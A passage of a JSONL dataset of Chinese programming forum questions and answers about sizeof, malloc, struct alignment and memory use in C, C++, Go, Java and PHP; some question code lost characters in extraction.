class=\"hljs-built_in\"&gt;free&lt;/span&gt;(t); &lt;span class=\"hljs-comment\"&gt;//释放指针&lt;/span&gt;\n}\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["能解一下这个吗，不太明白", ["struct comp  //复数comp有两个成员：实部re和虚部im", "{", "  float re;", "  float im;", "};", "struct comp* m(struct comp* x, struct comp* y) //函数功能为求两个复数的差", "\n", "{", "  【4】; //定义复数指针z", "  z = (struct comp*)malloc(sizeof(struct comp)); //为指针z分配空间", "  z->re = 【5】- 【6】; //z的实部等于x的实部减y的实部", "  z->im = 【7】 -【8】; //z的虚部等于x的虚部减y的虚部", "  return(z);", "}", "main()", "{", "  struct comp* t;", "  struct comp a, b;", "  a.re = 1;   a.im = 2;", "  b.re = 3;   b.im = 4;", "  t = m(【9】); //调用函数m求a与b的差", "  printf(\"z.re=%5.2f, z.im=%5.2f\", t->re, t->im);", "  free(t); //释放指针"]], "Tag": "程序设计"}
{"Answer": "https://blog.csdn.net/dsanmux/article/details/47866499", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["char字符与指针存放内存冲突怎么解决？", ["1.代码问题出现在链表连接上", "\n2.代码：", "\npNode CreateList(void)", "\n{", "\n    pNode p = NULL;", "\n    pNode rear=NULL;", "\n    char flag = 'y';    ", "\n\n", "\n", "\n\n", "do\n{\n\n    p = (pNode)malloc(sizeof(ListNode));\n\n    if (head == NULL)\n    {\n        head = p;\n    }\n\n    if(rear!=NULL)\n    {\n        rear ->next= p;\n    }\n\n\n    printf(\"\\n添加的编号:\\n\");\n    scanf(\"%d\", &p->data.num);\n\n\n    p->next = NULL;\n    rear = p;\n    printf(\"继续建表?(y/n):\");\n    scanf(\"%s\", &flag);\n} while (flag == 'y');\np->next = NULL;\nrear = NULL;       /*终端结点指针置空*/\np = NULL;\nreturn head;            /*返回链表头指针*/\n", "\n\n", "}", "\n3.问题描述：", "\n利用指针存放地址相同制作链表", "\n\n", "到第二部都没有问题", "\n\n", "但是一输入判读字符flag后rear指针存放地址就变了", "\n\n", "强制更改就会这样", "\n\n", "求大佬帮忙解决，重启过电脑了。。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;强制类型转换试试&amp;#xff1a;printf(&amp;#34;Number of bytes used to store a short int type variable is %d\\n&amp;#34;,(int)sizeof(char));&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["想问一下这个报错的意思 为什么每一句都会有下划线 (语言-c语言) sizeof可以这样用吗 run出来没有问题", ["想问一下这个报错的意思 为什么每一句都会有下划线 (语言-c语言) sizeof可以这样用吗 run出来没有问题"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;If you want to find out the size of a particular &lt;em&gt;value&lt;/em&gt;, there are two ways to do that - using the unsafe package, or using the reflection package. The following code demonstrates both:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;package main\n\nimport (\n    \"fmt\"\n    \"reflect\"\n    \"unsafe\"\n)\n\nfunc main() {\n    var i int\n    fmt.Printf(\"Size of var (reflect.TypeOf.Size): %d\n\", reflect.TypeOf(i).Size())\n    fmt.Printf(\"Size of var (unsafe.Sizeof): %d\n\", unsafe.Sizeof(i))\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;However, I am not aware of a way to get the size of a &lt;em&gt;type&lt;/em&gt; directly. But I think you'll find out that the sizeof function is not needed as often as in C.&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["等价于Go中的sizeof（aType）", ["\n\n", "C++ and several other languages have a function called ", "sizeof(int)", " (or whatever type you need) that returns the number of bytes consumed by a particular data type, in the current system.", "\n\n", "Is there an equivalent function in Go? What is it?", "\n    "]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;拷贝构造函数改成&lt;br /&gt;point&amp;#xff08;const point&amp;amp;)&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于c++对象数组有一些疑惑", ["#include", "using namespace std;", "class point{", "    public:", "        point(int xx=0,int yy=0);", "        ", "point();", "        point(point &p);", "        void print(){", "            cout<<x<<\"    \"<<y<<endl;", "        }", "        void move(int newx,int newy){", "            x=newx;", "            y=newy;", "        }", "    private:", "        int x;", "        int y;", "};", "point::point(point &p){", "    x=p.x;", "    y=p.y;", "    cout<<\"执行复制构造函数\"<<\"    \"<<x<<\"    \"<<y<<endl;", "}", "point::point(int xx,int yy){", "    x=xx;", "    y=yy;", "    cout<<\"执行构造函数\"<<\"    \"<<x<<\"    \"<<y<<endl;", "}", "point::", "point(){", "    cout<<\"执行析构函数\"<<\"    \"<<x<<\"    \"<<y<<endl;", "}", "int main(){", "    int i=0,j=7;", "    point a[4]={point(10,20),point(20,30)};", "    for(i=0,j=7;i<3;i++,j++){", "        a[i].move(i,j);", "    }", "    a[3]=a[1];", "    for(i=0;i<4;i++){", "        a[i].print();", "    }", "    return 0;", "}", "为什么报错，谢谢", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;Ok, answering this myself, as I figured it out by now. I still have no sources but my own research, so feel free to comment with any helpful links or answer on your own.&lt;/p&gt;\n\n&lt;p&gt;Most important thing first: a working formula to calculate the size necessary to store data in shared memory using &lt;code&gt;shm_*&lt;/code&gt; functions is:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;$header = 24; // actually 4*4 + 8\n$dataLength = (ceil(strlen(serialize($data)) / 4) * 4) + 16; // actually that 16 is 4*4\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;The header with the size of &lt;code&gt;$header&lt;/code&gt; is only stored once at the beginning of the memory segment and is stored when the segment is allocated (using &lt;code&gt;shm_attach&lt;/code&gt; the first time with that system v ressource key), even if no data is written. Therefore, you cannot ever create a memory segment smaller than 24 byte.&lt;/p&gt;\n\n&lt;p&gt;If you onyl want to use this and don'T care bout the details, just one warning: this is correct as long as PHP is compiled on a system that uses 32 bits for &lt;code&gt;long&lt;/code&gt;s in C. If PHP is compiled with 64 bit &lt;code&gt;long&lt;/code&gt;s, it's most likely a header size of &lt;code&gt;4 * 8 + 8 = 40&lt;/code&gt; and each data variable needs &lt;code&gt;(ceil(strlen(serialize($data)) / 8) * 8) + 32&lt;/code&gt;. Details in the explanation below.&lt;/p&gt;\n\n&lt;hr&gt;\n\n&lt;p&gt;So, how did I get there?&lt;/p&gt;\n\n&lt;p&gt;I looked into the PHP sourcecode. I don't know much C, so what I'm telling here is only how I got it, it may be nothing more than a lot of hot air...&lt;/p&gt;\n\n&lt;p&gt;The relevant files are already linked in the question - look there. The important parts are:&lt;/p&gt;\n\n&lt;p&gt;From &lt;code&gt;php_sysvshm.h&lt;/code&gt;:\n&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;typedef struct {\n    long key;\n    long length;\n    long next;\n    char mem;\n} sysvshm_chunk;\n\ntypedef struct {\n    char magic[8];\n    long start;\n    long end;\n    long free;\n    long total;\n} sysvshm_chunk_head;\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;And from &lt;code&gt;sysvshm.c&lt;/code&gt;:&lt;/p&gt;\n\n&lt;pre class=\"lang-c prettyprint-override\"&gt;&lt;code&gt;/* these are lines 166 - 173 in the sourcecode of PHP 5.2.17 (the one I found frist), \n   line nubmers may differ in recent versions */\n\n/* check if shm is already initialized */\nchunk_ptr = (sysvshm_chunk_head *) shm_ptr;\nif (strcmp((char*) &amp;amp;(chunk_ptr-&amp;gt;magic), \"PHP_SM\") != 0) {\n    strcpy((char*) &amp;amp;(chunk_ptr-&amp;gt;magic), \"PHP_SM\");\n    chunk_ptr-&amp;gt;start = sizeof(sysvshm_chunk_head);\n    chunk_ptr-&amp;gt;end = chunk_ptr-&amp;gt;start;\n    chunk_ptr-&amp;gt;total = shm_size;\n    chunk_ptr-&amp;gt;free = shm_size-chunk_ptr-&amp;gt;end;\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;pre class=\"lang-c prettyprint-override\"&gt;&lt;code&gt; /* these are lines 371 - 397, comments as above */\n\n /* {{{ php_put_shm_data\n * inserts an ascii-string into shared memory */\nstatic int php_put_shm_data(sysvshm_chunk_head *ptr, long key, char *data, long len)\n{\n    sysvshm_chunk *shm_var;\n    long total_size;\n    long shm_varpos;\n\n    total_size = ((long) (len + sizeof(sysvshm_chunk) - 1) / sizeof(long)) * sizeof(long) + sizeof(long); /* long alligment */\n\n    if ((shm_varpos = php_check_shm_data(ptr, key)) &amp;gt; 0) {\n        php_remove_shm_data(ptr, shm_varpos);\n    }\n\n    if (ptr-&amp;gt;free &amp;lt; total_size) {\n        return -1; /* not enough memeory */\n    }\n\n    shm_var = (sysvshm_chunk *) ((char *) ptr + ptr-&amp;gt;end);\n    shm_var-&amp;gt;key = key;\n    shm_var-&amp;gt;length = len;\n    shm_var-&amp;gt;next = total_size;\n    memcpy(&amp;amp;(shm_var-&amp;gt;mem), data, len);\n    ptr-&amp;gt;end += total_size;\n    ptr-&amp;gt;free -= total_size;\n    return 0;\n}\n/* }}} */\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;So, lot'S of code, I'll try to break it down.&lt;/p&gt;\n\n&lt;p&gt;The parts from &lt;code&gt;php_sysvshm.h&lt;/code&gt; tell us what size those structures ahve, we'll need that. I'm assuming each &lt;code&gt;char&lt;/code&gt; has8 bits (which is most likely valid on any system), and each &lt;code&gt;long&lt;/code&gt;has 32 bits (which may differ on some systems that actually use 64 bit - you have to change the numbers then).&lt;/p&gt;\n\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;sysvshm_chunk&lt;/code&gt; has &lt;code&gt;3*sizeof(long) + sizeof(char)&lt;/code&gt;, that makes &lt;code&gt;3*4 + 1 = 13&lt;/code&gt; bytes.  &lt;/li&gt;\n&lt;li&gt;&lt;code&gt;sysvshm_chunk_head&lt;/code&gt; has &lt;code&gt;8*sizeof(char) + 4*sizeof(long)&lt;/code&gt;, that makes &lt;code&gt;8*1 + 4*4 = 24&lt;/code&gt; bytes.&lt;/li&gt;\n&lt;/ul&gt;\n\n&lt;p&gt;Now the first part from &lt;code&gt;sysvshm.c&lt;/code&gt; is part of the code that gets executed when we're calling &lt;code&gt;shm_attach&lt;/code&gt; in PHP. It initializes the memory segment by writing a header strucutre - the one defined as &lt;code&gt;sysvshm_chunk_head&lt;/code&gt; we already talked about - if it'S not there already. This will need the 24 byte we calculated - the same 24 byte I gave in the formular right at the beginning.&lt;/p&gt;\n\n&lt;p&gt;The second part is the function that actually inserts a variable into the shared memory. This get's called by another function, but I skipped that one, as it's not that usefull. Basicall, it gets the shared memory header structure, whcih includes the addresses of start and end of the data inside the meory segment. It then gets a &lt;code&gt;long&lt;/code&gt;with the variavble key you used to store the variable, a &lt;code&gt;char*&lt;/code&gt; (well, similar to strings, but C version) with the already serialized data, and the length of that data (for whatever reason, it could calculate that on it's own, but anyway).&lt;br&gt;\nFor each data, a header (the structure defined as &lt;code&gt;sysvshm_chunk&lt;/code&gt; we looked at) plus the actual data is now written into the memory. It is aligned to &lt;code&gt;long&lt;/code&gt; however for easier memory management (that means: It's size is always rounded to the next multiple of &lt;code&gt;sizeof(long)&lt;/code&gt;, which is 4 bytes on most systems again). Now here it becomes a little strange. According to the C code we're looking at, &lt;code&gt;(ceil((strlen(serialize($data)) + 13 - 1) / 4) * 4) ;&lt;/code&gt; should work (that13 in there is &lt;code&gt;sizeof(sysvshm_chunk)&lt;/code&gt;). But: It doesn't. It always yields 4 bytes less then we actually need.  couldn't find those four bytes. I assume that the length of that serialized data (&lt;code&gt;len&lt;/code&gt;) is already alingned, but I didn't look into the source for that. But I couldn't find those 4 bytes anywhere else. The &lt;code&gt;char&lt;/code&gt; is lasted in the C structure definition, and &lt;code&gt;char&lt;/code&gt;is aligned on full bytes and nothing more, so that shouldn't cause those 4 additional bytes either - but if I'm wrong of how C alignes those, that could be the reason, too. ANyway, I aligned the data and the header individually in my formula, and it worked (aligned header alweayss has 16 bytes, that's the 16 in my formula, the data length gets aligned by that divide-round-multiply thingy). But, technically, the formula could also be \n&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt; $dataLength = (ceil((strlen(serialize($data)) + 13 - 1) / 4) * 4) + 4;\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;It yields the sam results however, if I just missed those 4 bytes somewhere else. I have no system with a PHP versoin running that was compiled with 64 bit &lt;code&gt;long&lt;/code&gt;s, so I cannot verify which one is correct.&lt;/p&gt;\n\n&lt;p&gt;&lt;strong&gt;tl;dr&lt;/strong&gt;: problem solved, comments welcome, if you got any additional questions, now is the time.&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["预测在共享内存中存储数据所需的大小", ["\n\n", "I'm working with the PHP shm (part of the ", "semaphores extension", ", not to be confused with the ", "shmop", " ones!) functions in a project. Basically the shared memory serves as kind of heap, I have only one array inside in which I'm storing keys (with meaningless values) as hashed index, I just check \"Ah, it's there already\". Now my problem is: that array can get quite big at times, but it doesn't always. I don't want to reserve a huge amount of memory I don't usually need, but rather resize dynamically.", "\n\n", "I have registered an error handler that converts errors into ", "ErrorException", "s, so I can ", "catch", " the error thrown by ", "shm_put_var", " when the memory is to small to store the array - but unfortunatly PHP clears the segment when data doesn't fit in there, so all other data is lost, too. This isn't an option therefore.", "\n\n", "Because of this, I need a way to predict the size I'll need to store the data. ", "One of the comments to ", "shm_attach", " at php.net", " states that PHP appends an header of ", "(PHP_INT_SIZE * 4) + 8", "bytes length, and one variable needs ", "strlen(serialize($foo)) + 4 * PHP_INT_SIZE) + 4", " ", "(I have simplified the expression given in the comment, it's equal to mine but was blown up unecessarily)", "\nWhile the header size seems to be correct (any memory smaller than 24 byte results in an error at creation, so 24 bytes seems to be the size of the header PHP puts in there), the size of each variable entry doesn't seem to hold true anymore in recent versions of PHP:", "\n - I could store \"1\" in a shared memory segment with a size of ", "24 + strlen(serialize(\"1\") + 3 * PHP_INT_SIZE) + 4", " byte (note the ", "3", " in there instead of ", "4", "),", "\n - I couldn NOT store \"999\" in one sized ", "24 + strlen(serialize(\"999\") + 4 * PHP_INT_SIZE) + 4", "\n\n", "Does anyone know a way to predict how much memory is needed to store any data in shared memory using the shm functions or has some reference on how shm stores the variables? (I read the whole contets using shmop functions and printed them, but since it's binary data it's not reverse-engineerable in reasonable time)", "\n\n", "(I will provide code samples as needed, I'm just not sure what parts will get relevant - ping me if you want to see any working samples, I have tried much so I have samples ready for most cases)", "\n\n", "\n", "[Update]", " My C is pretty bad, so I odn't get far looking at the source (", "sysvshm.c", " and ", "php_sysvshm.h", "), but I already found one issue with the solution that was suggested at php.net: While I could simplify the complex formula there to what I have included here (which was taken from the C sourcecode basically), this is NOT possible with the original one, as there are typecasts and no floating point math. The formula divides by ", "sizeof(long)", " and multiplies with it again - which is useless in PHP but does round to multiples of ", "sizeof(long)", " on C. SO I need to correct that in PHP first. Still, this is not everything, as Tests showed that I could store some values in even less memory than returned by the formula (see above).", "\n    "]], "Tag": "程序设计"}
{"Answer": "既然是C++，你可以用new函数，没有那么繁琐。p-&gt;front = p-&gt;rear = new listqueue.我做了一些复习资料，你可以康康", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["求助大神，c语言malloc内存分配失败，为什么", ["“头节点申请成功”未打印，请大神看一下怎么回事", "\n\n", "#include<iostream>\n#include<stdlib.h>\n#include<conio.h>\nusing namespace std;\n\n//链队列\ntypedef int datatype;\ntypedef struct Node{\n    datatype data;\n    struct Node *next; \n}linklist;\n\ntypedef struct{\n    linklist *front,*rear;\n}linkqueue; \n\n//置空队\nlinkqueue *SetNullQ(linkqueue *q)\n{\n    q->front=(linklist*)malloc(sizeof(linklist));   //申请头节点\n    cout<<\"头节点申请成功\"<<endl; \n    q->front->next=NULL;\n    q->rear=q->front;\n    cout<<\"置空队列成功\"<<endl; \n    return q; \n} \n\n//判队空\nint EmptyQ(linkqueue *q)\n{\n    if(q->front==q->rear)\n        return 1;\n    else\n        return 0;\n} \n\n//取队头节点数据\ndatatype *FrontQ(linkqueue *q)\n{\n    datatype *ret;\n    if(EmptyQ(q)){\n        cout<<\"queue is empty\"<<endl;\n        return NULL;\n    }\n    else{\n        ret=(datatype*)malloc(sizeof(datatype));\n        *ret=q->front->next->data;\n        return ret;\n    }\n}\n\n//入队\nvoid EnQueueQ(linkqueue *q,datatype x)\n{\n    q->rear->next=(linklist*)malloc(sizeof(linklist));\n    q->rear=q->rear->next;\n    q->rear->data=x;\n    q->rear->next=NULL;\n    cout<<x<<\"已入队\"<<endl; \n} \n\n//出队,返回被删除节点的值 \ndatatype *DeQueueQ(linkqueue *q)\n{\n    datatype *ret;\n    linklist *s;\n    if(EmptyQ(q)){\n        cout<<\"queue is empty\"<<endl;\n        return NULL;\n    }\n    else{\n        s=q->front->next;\n        if(s->next==NULL)\n        {\n            q->front->next=NULL;\n            q->rear=q->front;\n        }\n        else q->front->next=s->next;\n        ret=(datatype*)malloc(sizeof(datatype));\n        *ret=s->data;\n        return ret;\n    }\n} \n\nint main()\n{\n    linkqueue *q=NULL;\n    cout<<\"置空队列\"<<endl; \n    SetNullQ(q);\n    datatype x;\n    cout<<\"请输入要入队的元素，以#结束：\"<<endl; \n    while((x=getche())!='#')\n    {\n        EnQueueQ(q,x);\n    }\n    cout<<\"取队头元素\"<<endl; \n    datatype *a=FrontQ(q);\n    cout<<\"队头元素为\"<<*a<<endl;\n    cout<<\"出队,返回被删除节点的值 \"<<endl;\n    datatype *b=DeQueueQ(q);\n    cout<<\"节点\"<<*b<<\"已被删除\"<<endl;\n    cout<<\"出队,返回被删除节点的值 \"<<endl;\n    datatype *c=DeQueueQ(q);\n    cout<<\"节点\"<<*c<<\"已被删除\"<<endl;\n    return 0;\n}\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;l-&amp;gt;elem &amp;#61; 0;相当于l-&amp;gt;elem &amp;#61; NULL;&lt;br /&gt;这一句把分配内存的操作给抹掉了。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["数据结构中如何用c语言给数据元素赋值？", ["#", "include", "<stdio.h>", "\n", "#", "include", "<stdlib.h>", "\n\n", "#", "define", " MAXSIZE 100", "\n", "#", "define", " OK 1", "\n", "#", "define", " ERROR 0", "\n", "#", "define", " status int", "\n\n", "typedef", " ", "struct", "\n{\n    ", "float", " codf;\n    ", "int", " expn;\n } book;\n ", "typedef", " ", "struct", "\n {\n     book *elem;\n     ", "int", " length;\n }sqlist;\n \n ", "status ", "Initlist", "(sqlist *l)", " \n ", "{\n     l->elem=(book *)", "malloc", "(MAXSIZE * ", "sizeof", "(book));\n     ", "if", "(!l->elem) ", "exit", " (ERROR);\n     l->elem=", "0", ";\n     ", "return", " OK;\n }\n ", "status ", "listinsert", "(sqlist*l,book e)", "\n", "{\n           ", "int", " i=", "0", ";    \n            l->elem[i] = e;", "//在这一行被卡主了，程序停止运行", "\n               ", "printf", "(", "\"ok\"", ")；\n        l->length++;\n        i++;\n        ", "return", " OK;\n}\n ", "int", " ", "main", "()", "\n ", "{    \n     sqlist l;\n     ", "if", "(", "Initlist", "(&l)) \n     ", "printf", "(", "\"ok\"", ");\n     book e;\n     e.codf=", "2", ";\n     e.expn=", "1", ";\n     ", "if", "(", "listinsert", "(&l,e))\n     ", "printf", "(", "\"ok\"", ");    \n }\n\n", "\n", "输出结果是一个OK，之前试过了，应该是在上面标准的那里卡住了，无法把e赋值给l->elem[i],请问这是为什么，怎样解决？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;有arr.length&amp;#xff0c;直接可以获取数组的长度&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["java里面没有sizeof 那我这个二分查找的sz该怎么写 尽量详细点", ["java里面没有sizeof 那我这个二分查找的sz该怎么写 尽量详细点"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;先判断a是否大于   [if&amp;#xff08;a&amp;gt;b&amp;#xff09;]&lt;br /&gt;1.如果a大于b 就继续判断a是否大于c   [if&amp;#xff08;a&amp;gt;c&amp;#xff09;]&lt;br /&gt;如果a大于c 执行      [  printf(“od\\n&amp;#34;,a&amp;#xff09;]&lt;br /&gt;如果a不大于c 跳出if语句 执行最后的打印语句      [printf(“overln”&amp;#xff09;]&lt;br /&gt;2.如果a不大于b  执行       [printf(“%dln”,b]&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["能不能告诉我这个该怎么理解", []], "Tag": "程序设计"}
{"Answer": "如果实在搞不懂 realloc 是如何运行的，但又担心是它引起的错误，可以考虑自己用 calloc 代替：申请一块大的空间，将以前空间中的数据复制到新申请的空间中，再释放以前的空间。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["新人求助，c语言问题。", ["程序的功能是输入字符串存入pS指针，进行大小对比后按从小到大输出。发现当输入字符串超过5个时程序会停止运行，恳请哪位大神帮我看下代码有什么问题。", "\n代码如下：", "\n#include", "\n#include", "\n#include", "\n#define BUF_LEN 100", "\n#define COUNT 5", "\nint main(void)", "\n{", "\nchar buf[BUF_LEN];", "\nsize_t str_count=0;", "\nsize_t capacity=COUNT;", "\nchar ", "pS=(char", ")calloc(capacity,sizeof(char*));", "\nchar** psTemp=NULL;", "\nchar* pTemp=NULL;", "\nsize_t str_len=0;", "\nbool sorted=false;", "\nprintf(\"Enter strings to be sorted,one per line.Press Enter to end:\\n\");", "\nchar ", "ptr=NULL;", "\nwhile(true)", "\n{", "\n    ptr=fgets(buf,BUF_LEN,stdin);", "\n    if(!ptr)", "\n    {", "\n        printf(\"Error reading string.\\n\");", "\n        free(pS);", "\n        pS=NULL;", "\n        return 1;", "\n    }", "\n    if(*ptr=='\\n') break;", "\n    if(str_count==capacity)", "\n    {", "\n        capacity+=capacity/4;", "\n        if(!(psTemp=(char", "*)realloc(pS,capacity)))  return 1;", "\n        pS=psTemp;", "\n    }", "\n    str_len=strlen(buf)+1;", "\n    if(!(pS[str_count]=(char*)malloc(str_len))) return 2;", "\n    strcpy(pS[str_count++],buf);", "\n}", "\nwhile(!sorted)", "\n{", "\n    sorted=true;", "\n    for(size_t i=0;i\n    {", "\n        if(i==(str_count-1))", "\n       break;", "\n        if(strcmp(pS[i],pS[i+1])>0)", "\n        {", "\n            sorted=false;", "\n            pTemp=pS[i];", "\n            pS[i]=pS[i+1];", "\n            pS[i+1]=pTemp;", "\n        }", "\n    }", "\n}", "\nprintf(\"Your input sorted in ascending sequence is:\\n\\n\");", "\nfor(size_t k=0;k<str_count;++k)", "\n{", "\n    printf(\"%s\",pS[k]);", "\n    free(pS[k]);", "\n    pS[k]=NULL;", "\n}", "\nfree(pS);", "\npS=NULL;", "\n    return 0;", "\n}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;如果没有其它条件的话&amp;#xff0c;你这样是不行的。整型数组参数还是需要给出长度&lt;br /&gt;或者说你有明确的结束值&amp;#xff0c;就像字符串为什么不需要给出长度&amp;#xff0c;是因为它明确0为字符串结束标志&lt;br /&gt;作为具体代码&amp;#xff0c;你的int a[]数组如果有约定&amp;#xff0c;比如以0&amp;#xff0c;-1&amp;#xff0c;0xFFFFFFFF、9999之类的为无效值的话&amp;#xff0c;也可以作为结束标志来判断数组长度。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["想问问c++中sizeof求形参数组的长度的问题", ["我想构造一个求数组长度的函数，但是因为形参数组在传递给函数时退化成指针了，而sizeof()指针的长度就一直恒定了，所以想问问还有没有有其他的方法来构造函数求数组长度", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;申明变量&amp;#xff0c;NewNode是Node类型的指针&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["Node *NewNode = (Node *)malloc(sizeof(Node));等号前面代表什么", ["Node *NewNode = (Node *)malloc(sizeof(Node));"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;struct以其内部最长的成员作为基准值,其size为基准值的整数倍&lt;br /&gt;Student内最长的是4字节的int,一共有4个元素,所以最终的size为16字节,其中char被以4字节对齐,也就是后面填充3字节来达成对齐目的&lt;br /&gt;&lt;a href=\"https://www.runoob.com/w3cnote/struct-size.html\" id=\"textarea_1630651370328_1630651521198_0\" class=\"md_link_card\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;\n  \n    &lt;span class=\"md_link_title\"&gt;结构体大小的计算 | 菜鸟教程&lt;/span&gt;\n    \n  &lt;span class=\"md_link_desc\" style=\"\"&gt;用最简单的方法&amp;#xff0c;通俗易懂的方法计算结构体大小。 结构体计算要遵循字节对齐原则。  结构体默认的字节对齐一般满足三个准则&amp;#xff1a;  1) 结构体变量的首地址能够被其最宽基本类型成员的大小所整除&amp;#xff1b;  2) 结构体每个成员相对于结构体首地址的偏移量&amp;#xff08;offset&amp;#xff09;都是成员大小的整数倍&amp;#xff0c;如有需要编译器会在成员之间加上填充字节&amp;#xff08;internal adding&amp;#xff09;&amp;#xff1b;  3) 结构体的总大小为结构体最宽基本类型成员大小的整数倍&amp;#xff0c;如有需要编译器会在最末一个成员..&lt;/span&gt;\n  &lt;span class=\"md_flex_card\"&gt;\n  &lt;img class=\"md_link_img\" id=\"md_link_img\" src=\"https://static.runoob.com/images/favicon.ico\" /&gt;\n    &lt;span class=\"flex-1\"&gt;\n      &lt;span class=\"md_link_url\"&gt;https://www.runoob.com/w3cnote/struct-size.html&lt;/span&gt;\n    &lt;/span&gt;\n  &lt;/span&gt;&lt;/a&gt;&lt;br /&gt;有帮助望采纳&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["请问一道有关sizeof的题", ["请问为什么输出前三个是16，为什么不是int+char+int+float＝4+1+4+4＝13", "\n"]], "Tag": "程序设计"}
{"Answer": "https://blog.csdn.net/martin_liang/article/details/42436213", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["Stack with operations on middle element", ["希望有哪位大佬可以帮助我解决这道题！", "\n\n", "需要实现的功能：", "\n\n", "1）  push（）  将元素添加到堆栈顶部。", "\n\n", "2）  pop（）  从堆栈顶部删除一个元素。", "\n\n", "3）  findMiddle（）  将返回堆栈的中间元素。", "\n\n", "4）deleteMiddle（）  将删除堆栈的中间元素。", "\n\n", "那么，用于实现此特殊堆栈的数据结构是什么？", "\n\n", "使用**双链表**（DLL）。我们可以通过保持mid指针来在O（1）时间中找到中间元素。我们可以使用上一个和下一个指针在两个方向上移动中间指针。", "\n\n", "\n\n", "不要修改源代码，并完成push（）、pop（）、 findMiddle（）、deleteMiddle（）四个元素", "\n\n", "//-----Include required headers here-----\n#include <stdio.h>\n#include <stdlib.h>\nusing namespace std;\n//-----End of headers-----\n\n\n//-----Add new functions here(if any)-----\n\n//-----New functions end here-----\n\n//-----A Doubly Linked List Node-----\n// DO NOT MODIFY IT\nstruct DLLNode {\n    struct DLLNode *prev;\n    int data;\n    struct DLLNode *next;\n};\n\n/* Representation of the stack data structure that supports findMiddle(),\n   deleteMiddle() in O(1) time.  The Stack is implemented using Doubly \n   Linked List. It maintains pointer to head node, pointer to middle \n   node and count of nodes */\n// DO NOT MODIFY IT\nstruct myStack {\n    struct DLLNode *head;\n    struct DLLNode *mid;\n    int count;\n};\n\n//-----Function to create the stack data structure-----\n// DO NOT uncomment the below function. It is for your reference purpose only.\n// We will use this function to create the stack.\n/*struct myStack *createMyStack() {\n    struct myStack *ms = (struct myStack*) malloc(sizeof(struct myStack));\n    ms->count = 0;\n    ms->head = NULL;\n    ms->mid = NULL;\n    return ms;\n}; */\n\n//-----Function to push an element to the stack-----\nvoid push(struct myStack *ms, int new_data) {\n    /* allocate DLLNode and put in data */\n    struct DLLNode* new_DLLNode = (struct DLLNode*) malloc(sizeof(struct DLLNode));\n    new_DLLNode->data  = new_data;\n\n    //-----Appropriately update new_DLLNode and ms to get the functionality-----\n\n\n    //-----code ends here-----\n}\n\n//-----Function to pop an element from stack. Return the popped element-----\n//-----Will not be called for empty stack-----\nint pop(struct myStack *ms) {\n    struct DLLNode *head = ms->head;\n    int item = head->data;\n\n    //-----Appropriately update ms to get the required functionality-----\n\n\n    //-----code ends here-----\n\n    free(head);\n\n    return item;\n}\n\n//-----Function for finding middle of the stack-----\n//-----Will not be called for empty stack-----\nint findMiddle(struct myStack *ms) {\n    //-----code begins here-----\n\n\n    //-----code ends here-----\n}\n\n//-----Function for deleting middle of the stack-----\n//-----Return the value deleted, will not be called for empty stack-----\nint deleteMiddle(struct myStack *ms) {\n    //-----code begins here-----\n\n\n    //-----code ends here-----\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;可能是有字节对齐 8字节对齐了&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["虚继承后sizeof和开发人员命令提示符算出的类 字节数不一样", ["问题遇到的现象和发生背景", "\n", "   通过sizeof函数得出的字节数和在开发人员命令提示符中的不一样", "\n", "用代码块功能插入代码，请勿粘贴截图", "\n", "class Father", "{", "public:", "\n", "int age", ";", "\n", "\n", "};", "\n", "class Son1 : virtual public Father", "{", "\n", "};", "\n", "运行结果及报错内容", "\n", "  sizeof为16 开发人员命令提示符为8", "\n", "我的解答思路和尝试过的方法", "\n", "我是64位，指针不应该是8吗？加一个int应该是12啊，是虚继承里面我有什么不懂的吗？"]], "Tag": "程序设计"}
